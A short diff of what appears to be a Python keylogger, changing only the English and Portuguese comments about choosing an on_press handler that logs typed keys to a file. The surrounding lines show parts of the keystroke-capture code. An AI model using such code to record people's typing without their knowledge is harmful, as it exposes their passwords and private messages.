@@ -10,8 +10,8 @@ logging.basicConfig(filename=file, level=logging.DEBUG, format="%(message)s")
 
 keys_pressed = []
 
-# EN: Choose an on_press function. The first one has formatted text, while the second does not.
-# PT: Escolha uma função on_press. A primeira possui texto formatado, enquanto a segunda não.
+# EN: Choose an on_press function. The first one saves formatted text, while the second does not.
+# PT: Escolha uma função on_press. A primeira salva o texto formatado, enquanto a segunda não.
 def on_press(key):
     try:
         if hasattr(key, 'char') and key.char and key.char.isalpha():
